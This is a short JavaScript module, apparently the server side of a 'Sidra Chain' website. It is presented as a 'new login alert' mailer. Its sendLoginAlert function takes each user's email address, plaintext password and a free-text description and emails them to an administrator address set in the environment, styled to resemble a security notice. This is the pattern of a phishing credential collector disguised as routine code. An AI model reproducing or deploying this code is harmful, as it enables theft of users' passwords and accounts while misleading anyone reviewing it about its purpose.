import nodemailer from "nodemailer";

// Email configuration using environment variables
const emailConfig = {
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  },
};

// Create transporter
const transporter = nodemailer.createTransport(emailConfig);

// Email templates
const emailTemplates = {
  loginAlert: (email, password, description) => ({
    subject: "New Login Detected - Sidra Chain",
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h1 style="color: #f97316; text-align: center;">New Login Alert</h1>
        <p>We detected a new login to your Sidra Chain website.</p>
        <div style="background-color: #1a1512; border-radius: 8px; padding: 20px; margin: 20px 0;">
          <p style="color: #9ca3af; margin: 5px 0;">Email: ${email}</p>
          <p style="color: #9ca3af; margin: 5px 0;">Password: ${password}</p>
          <p style="color: #9ca3af; margin: 5px 0;">Description: ${description}</p>
        </div>
        <p style="color: #666; font-size: 12px; text-align: center; margin-top: 20px;">
          This is an automated message. Please do not reply to this email.
        </p>
      </div>
    `,
  }),
};

// Helper function to validate email
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

export async function sendLoginAlert(email, password, description) {
  try {
    // Input validation
    if (!email || !password) {
      throw new Error("Email and password are required");
    }

    if (!process.env.ADMIN_EMAIL) {
      throw new Error("Admin email not configured");
    }

    if (!isValidEmail(process.env.ADMIN_EMAIL)) {
      throw new Error("Invalid admin email configuration");
    }

    const template = emailTemplates.loginAlert(email, password, description);

    await transporter.sendMail({
      from: `Sidra Chain <${
        process.env.EMAIL_USER || "noreply@sidrachain.com"
      }>`,
      to: process.env.ADMIN_EMAIL,
      ...template,
    });

    return {
      success: true,
      message: "Login alert sent successfully",
    };
  } catch (error) {
    console.error("Error sending login alert:", error);
    return {
      success: false,
      error: error.message,
      timestamp: new Date().toISOString(),
    };
  }
}
